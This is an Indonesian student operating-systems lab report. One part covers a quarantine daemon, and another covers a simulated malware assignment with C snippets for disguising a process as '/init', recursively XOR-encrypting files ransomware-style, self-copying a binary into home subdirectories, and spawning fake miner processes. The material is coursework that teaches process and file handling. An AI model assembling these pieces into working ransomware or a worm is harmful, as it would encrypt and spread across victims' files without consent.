# Laporan Praktikum Sisop Modul 2 Kelompok IT21
# Anggota
1. Nisrina Bilqis - 5027241054
2. Hanif Mawla Faizi - 5027241064
3. Dina Rahmadani - 5027241065

# Soal_1

# Soal_2
## 1. Deskripsi Soal

Pada soal ini, kita diminta untuk membantu karakter fiktif bernama Kanade Yoisaki yang komputernya terkena malware ringan. Tujuan utama program starterkit adalah untuk membantu proses identifikasi dan penanganan file-file yang mungkin berisi malware di dalam direktori starter_kit. Program ini dibangun dalam bahasa C dan memiliki beberapa fitur, antara lain:

Decrypt nama file dari format Base64.
Quarantine file ke folder `quarantine.`
Return file dari folder quarantine ke `starter_kit.`
Eradicate atau menghapus semua file di `quarantine.`
Shutdown daemon decrypt melalui PID proses.
Logging semua aktivitas ke dalam file `activity.log.`

## 2. Struktur Direktori

Setelah program berjalan, struktur direktori akan menjadi seperti berikut:

`soal_2
├── activity.log
├── quarantine
├── starter_kit
│   └── <file hasil unzip>
├── starterkit
└── starterkit.c`

## 3. Fitur Program

a. `--decrypt`
Menjalankan proses daemon yang mendekripsi nama file yang terenkripsi dengan Base64 pada direktori starter_kit.

Contoh log:
`[18-04-2025][12:00:00] - Successfully started decryption process with PID 12345.
`
b. `--quarantine`
Memindahkan semua file dari starter_kit ke direktori quarantine.

Contoh log:
`[18-04-2025][12:01:00] - infected_file.exe - Successfully moved to quarantine directory.
`
c. `--return`
Mengembalikan file dari quarantine ke direktori starter_kit.

Contoh log:
`[18-04-2025][12:02:00] - infected_file.exe - Successfully returned to starter kit directory.
`
d. `--eradicate`
Menghapus semua file yang ada di dalam direktori quarantine.

Contoh log:
`[18-04-2025][12:03:00] - infected_file.exe - Successfully deleted.
`
e. `--shutdown`
Menghentikan proses daemon decrypt berdasarkan nama proses (starterkit).

Contoh log:
`[18-04-2025][12:04:00] - Successfully shut off decryption process with PID 12345.
`
## 4 Penjelasan Kode

a. Logging dan Timestamp
Fungsi `log_activity()` dan `write_log()` digunakan untuk mencatat aktivitas ke dalam file `activity.log`. Timestamp diambil menggunakan `strftime()`.

b. Base64 Decode
Fungsi `decode_base64()` menggunakan `popen` untuk menjalankan perintah `echo <encoded> | base64 -D`, lalu mengganti nama file dengan nama hasil dekripsi.

c. File Handling
`move_all_files()` untuk memindahkan file antar folder.
`delete_files()` untuk menghapus semua file di dalam folder.
`terminate_process()` menjalankan `pkill -f` untuk mematikan proses.
`start_daemon()` membuat proses daemon yang berjalan di background.

## 5. Error Handling

Program akan menampilkan pesan bantuan jika argumen yang diberikan tidak sesuai:
`Usage: ./starterkit [--decrypt | --quarantine | --return | --eradicate | --shutdown]
`
## 6. Kesimpulan

Program `starterkit` yang telah dibuat membantu simulasi penanganan file malware dengan fitur manajemen file, dekripsi nama, serta pencatatan log. Program ini menunjukkan kemampuan dasar manajemen file, proses, serta pembuatan daemon di sistem operasi Linux.

## Revisi 

## a. Tidak Ada Fitur Otomatis Mengunduh File Starter Kit

Program `starterkit` belum memiliki fitur otomatis untuk mengunduh file zip starter kit dari URL yang diberikan. Dalam soal disebutkan bahwa Mafuyu memberikan link untuk mengunduh file zip, namun implementasi dalam program ini mengasumsikan bahwa file hasil unzip sudah tersedia di dalam direktori `starter_kit.`

Saran Perbaikan:

Tambahkan mekanisme menggunakan `wget` atau `libcurl` untuk mengunduh file zip dari URL.
Tambahkan fungsi untuk melakukan `unzip` file tersebut secara otomatis dan menghapus file zip setelahnya, seperti yang diminta dalam narasi soal.

`// Contoh (dengan system command):
system("wget <link> -O starter_kit.zip");
system("unzip starter_kit.zip -d starter_kit");
remove("starter_kit.zip");
`
## b. Tidak Ada Log History Spesifik Saat Karantina

Pada proses --quarantine, program hanya mencatat satu log umum:
`[dd-mm-YYYY][HH:MM:SS] - Quarantine process executed.
`
Namun tidak mencatat nama-nama file yang dipindahkan satu per satu, seperti yang diminta dalam format log:
`[nama file] - Successfully moved to quarantine directory.
`
## Revisi kode log:
`snprintf(log_entry, sizeof(log_entry), "[%s] - %s - Successfully moved to %s directory.",
         timestamp, entry->d_name, strcmp(dest_dir, QUARANTINE_DIR) == 0 ? "quarantine" : "starter kit");
`

# Soal_3
## Deskripsi Soal

Pada soal ini, kami diminta untuk mensimulasikan sebuah malware yang terdiri dari beberapa fitur layaknya ransomware atau worm sungguhan. Malware ini terdiri dari beberapa proses anak yang berjalan secara daemon dan berfungsi untuk mengenkripsi data, menyebarkan salinan binary, serta melakukan simulasi cryptomining.

Seluruh fitur harus dijalankan melalui satu binary utama `runme`, yang akan berubah nama prosesnya menjadi `/init`. Kemudian, secara paralel, `runme` akan memunculkan tiga proses anak:
- `wannacryptor` → proses enkripsi file
- `trojan.wrm` → proses penyebaran malware
- `rodok.exe` → proses simulasi fork bomb + cryptominer

Malware ini berjalan berulang setiap 30 detik, dan hanya `runme` yang benar-benar dijalankan, tidak mengeksekusi ulang hasil salinan malware yang tersebar.

---

### A : Daemon dan Rename Proses
```c
daemonize();
prctl(PR_SET_NAME, "/init", 0, 0, 0);
```
- Program `runme` melakukan `daemonize()` untuk berjalan di background tanpa terminal.
- Menggunakan `prctl(PR_SET_NAME, "/init", ...)` untuk mengubah nama proses menjadi `/init`.
- Hal ini membuat proses utama malware tersamarkan saat dilihat di proses list (`ps`).

---

### B : Enkripsi oleh `wannacryptor`
```c
void xor_file(const char *filepath, unsigned char key) {
    FILE *fp = fopen(filepath, "rb+");
    if (!fp) return;
    int ch;
    while ((ch = fgetc(fp)) != EOF) {
        fseek(fp, -1, SEEK_CUR);
        fputc(ch ^ key, fp);
    }
    fclose(fp);
}

```
```c
unsigned char key = (unsigned char)(time(NULL) % 256);
wannacryptor(root_path, key);

```
- Fungsi **wannacryptor()** akan men-scan semua file dan folder dalam direktori tempat **runme** dijalankan, lalu mengenkripsinya menggunakan operasi XOR dengan key dari timestamp.
- File **keylog.txt** disimpan untuk jaga-jaga bila perlu dekripsi.
- Karena kelompok **ganjil**, metode yang digunakan adalah **enkripsi rekursif langsung**, bukan ZIP.

---

### C : Penyebaran Malware oleh `trojan.wrm`
```c
void spread_malware(const char *self_path) {
    ...
    snprintf(dest, sizeof(dest), "%s/runme", path);
    ...
    fwrite(buf, 1, n, dst);
    chmod(dest, 0755);
}

```
**Hasil yang Diharapkan :**
- Proses `trojan.wrm` akan menyebarkan salinan binary `runme` ke semua subdirektori dalam `/home/user`.
- Penyebaran hanya sebatas penyalinan (tidak mengeksekusi ulang salinan).
- Binary yang disalin tetap bernama `runme` dan memiliki izin eksekusi (chmod 755).

---

### D : Looping 30 Detik
```c
while (1) {
    ...
    wannacryptor(...);
    sleep(30);
}

```
- Proses **wannacryptor** dan **trojan.wrm** berjalan selamanya dan melakukan tugasnya tiap 30 detik.
- **runme** utama akan tetap aktif dan menjadi parent dari seluruh proses ini.

---

### E & F : Fork Bomb & Cryptomining oleh `rodok.exe`
```c
void spawn_miners() {
    for (int i = 0; i < 4; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            snprintf(name, sizeof(name), "mine-crafter-%d", i);
            ...
            while (1) {
                sleep(delay);
                generate_hash(hash);
                ...
                fprintf(f, "%s[Miner %02d] %s\n", timestamp, i, hash);
            }
        }
    }
}

```
```c
if (fork() == 0) {
    prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
    spawn_miners();
    while (1) pause();
}

```
- **rodok.exe** akan memunculkan 4 proses **mine-crafter-XX** yang melakukan hashing acak (cryptomining) setiap 3–30 detik.
- Nama proses diubah agar tampil sebagai **mine-crafter-0**, **mine-crafter-1**, dst.
- Log hasil mining ditulis ke **/tmp/.miner.log**.

---

### G : Logging Hash Cryptominer
**Contoh Log :**
```c
[2025-04-10 17:32:05][Miner 00] d1f4c93aa8dabc17e9a4...
```
**File Output :**
```
/tmp/.miner.log
```
- Hasil cryptomining dari setiap **mine-crafter** dicatat lengkap dengan timestamp dan ID prosesnya.

---

### H : Dependency Proses Fork
- rodok.exe adalah parent dari semua proses mine-crafter-XX.
- Karena rodok.exe menjalankan pause(), prosesnya tetap hidup dan menjaga anak-anaknya.
- Jika rodok.exe dihentikan (kill), maka semua mine-crafter juga akan mati.

---

### ❕REVISI❕
---
### 1. Penyebaran ***runme*** ke direktori ***home/user***
### 🔻 Sebelumnya:
Kode hanya menyebar ke folder di dalam /home/user, lewat loop:
```c
DIR *dir = opendir("/home/user");
while ((entry = readdir(dir)) != NULL) {
    ...
    if (S_ISDIR(st.st_mode)) {
        snprintf(dest, sizeof(dest), "%s/runme", path);
        ...
        fwrite(...);  // salin file runme
        spread_malware(path, self_path); // rekursif
    }
}
```
### ✅ Sesudah :
```c
struct stat st;
if (stat(base_path, &st) == 0 && S_ISDIR(st.st_mode)) {
    char dest[MAX_PATH];
    snprintf(dest, sizeof(dest), "%s/runme", base_path);

    FILE *src = fopen(self_path, "rb");
    FILE *dst = fopen(dest, "wb");
    if (src && dst) {
        char buf[1024];
        size_t n;
        while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
            fwrite(buf, 1, n, dst);
        fclose(src);
        fclose(dst);
        chmod(dest, 0755);
    }
}
```
Bagian ini akan selalu menyalin **runme** ke folder **base_path** saat fungsi dipanggil, termasuk **/home/user**.

### Setelah malware dijalankan :
```
/home/user/
├── runme               ← disalin ke direktori ini
├── Documents/
│   └── runme
├── Downloads/
│   └── runme
├── Pictures/
│   └── runme
```

# Soal_4
